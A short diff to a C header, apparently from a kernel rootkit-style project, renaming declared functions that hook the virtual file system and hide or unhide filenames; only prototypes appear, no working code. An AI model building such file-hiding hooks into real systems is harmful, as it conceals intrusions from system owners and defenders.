@@ -10,7 +10,7 @@ struct dir_context {
 #endif
 
 void hook_vfs(void);
-int hide_filename_starting_with(const char *name, unsigned int len);
-int unhide_filename_starting_with(const char *name, unsigned int len);
+int hide_filename(const char *name, unsigned int len);
+int unhide_filename(const char *name, unsigned int len);
 
 #endif
